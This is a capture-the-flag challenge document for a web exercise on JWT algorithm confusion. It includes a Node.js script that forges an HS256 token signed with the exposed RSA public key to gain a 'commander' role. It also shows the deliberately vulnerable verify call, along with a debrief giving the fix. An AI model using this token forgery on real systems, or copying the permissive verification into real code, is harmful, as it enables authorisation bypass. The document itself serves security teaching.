# Challenge Document

### Version: `0.1.0`

### Long Title: Well, isn't that confusing?

### Short Title: WEB01

### Author: Lewis Clarke

### Date: 05/08/2025

### Difficulty: Medium

### Learning objective: Learn how to exploit insecure JWT verification via algorithm confusion

## Challenge Brief (as its to be written in RIO):

You're an undercover operative embedded deep within enemy-controlled space. Disguised as a civilian passenger, you've infiltrated a high-security starship just as it docks at Astra-9, a critical command station overseeing this sector.

Your objective is to override defenses and disable all vital systems. Once compromised, your Empire's fleet will commence a full-scale assault to seize control.

## Solve:

### Solution as intended

1. Navigate to `/robots.txt` and notice the `Disallow: /access-logs`
2. Navigate to `/access-logs`

- Identify a name where access was 'Granted'
- Note the locations 'Docking Bay' and 'Bridge'

3. Return to `/docking-bay`, enter a valid name, e.g. 'Nova'
4. Inspect the 'Application' tab in the console and note the `astral_token` cookie that has been generated. Copy paste the value into the decoder at https://www.jwt.io/
5. Note the JWT header alg `RS256`. Note the claims payload fields: `name`, `role`
6. From the locations we noted earlier, navigate to `/bridge`
7. We are denied access and our role needs to be 'commander'
8. Return to `/docking-bay`
9. View the 'alt' of the portrait image and note the value 'Commander Reinhard'

- Note: This is important as any name other than 'Reinhard' will reject bridge authorisation, even if the role is 'commander'

10. Notice the text "Portait of a **well-known** commander"
11. Navigate to `/.well-known/jwks.json`

- The JWT header alg value `RS256` suggests asymmetric signing.
  Public keys are often exposed at `/.well-known/jwks.json` for signature verification.
  The 'well-known commander' hint should aid in directing players there.

12. Convert the JWK to a PEM-formatted public key. You can do this via a number of methods, one example online: https://8gwifi.org/jwkconvertfunctions.jsp
13. Run the below script with the path to the resulting .pem file

```js
const jwt = require("jsonwebtoken");
const fs = require("fs");

const publicKey = fs.readFileSync("converted-public.pem", "utf8");
const payload = {
  name: "Reinhard",
  role: "commander",
};

const token = jwt.sign(payload, publicKey, { algorithm: "HS256" });
console.log(token);
```

14. Set the astral_token cookie value to the output of the above script
15. Navigate to `/bridge`
16. See the flag on the page!

### Solution with no exploration

1. Navigate to `/.well-known/jwks.json`
2. Convert the public key to a .pem. You can do this via a number of methods, one example online: https://8gwifi.org/jwkconvertfunctions.jsp
3. Run the below script with the path to the public key .pem

```js
const jwt = require("jsonwebtoken");
const fs = require("fs");

const publicKey = fs.readFileSync("converted-public.pem", "utf8");
const payload = {
  name: "Reinhard",
  role: "commander",
};

const token = jwt.sign(payload, publicKey, { algorithm: "HS256" });
console.log(token);
```

4. Set the astral_token cookie value to the output of the above script
5. Navigate to `/bridge`
6. See the flag on the page!

Try harder, be better, lmgtfy, its right there, jesu...

## Author Notes:

Was it just as fun creating the challenge context than the exploit itself? Who knows?

Feel free to change the public/commander_portait.png image to a picture of Simon.

## Debrief:

This challenge highlights a subtly flawed JWT configuration. The developer assumed tokens would only use RS256 and hardcoded the RSA public key for verification. However, the server allows other algorithms, so when the alg header is changed to HS256, it incorrectly uses the public key as a symmetric HMAC secret. Since this key is publicly available, an attacker can forge valid tokens with arbitrary claims, effectively bypassing authorisation checks.

Vulnerable line:

```js
const data = jwt.verify(token, publicKey, { algorithms: ["RS256", "HS256"] });
```

Simple fix:

```js
const data = jwt.verify(token, publicKey, { algorithms: ["RS256"] });
```

In NodeJS, though the commonly-used [`jsonwebtoken`](https://www.npmjs.com/package/jsonwebtoken) library prevents public keys from being used as HMAC secrets in versions >8.5.1, the vulnerable version is still widely used. As of writing this challenge, npm [reports](https://www.npmjs.com/package/jsonwebtoken?activeTab=versions) 3.1 million downloads in the last 7 days.

PortSwigger has an extensive write-up and a number of labs on JWT attacks, including algorithm confusion: https://portswigger.net/web-security/jwt/algorithm-confusion

To take it a step further, review the section 'Deriving public keys from existing tokens' whereby you can carry out a similar attack to this challenge but with no public key exposed like was at `/.well-known/jwks.json` here.

## Hints:

1. In /access-logs note the names granted access as well as the 2 locations.

2. We're issued a JWT in the astral_token cookie upon successfully docking. If only we could generate our own with the commander role... but that RS256 alg is tricky.

3. The phrase "well-known commander" isn't just narrative flavour. Is there anything in relation to JWT that is "well-known"?

4. Now we've converted the JWK to a PEM public key and crafted our own token, we have everything except a name. I wonder if that commander portrait contains any hidden markings on who he is...
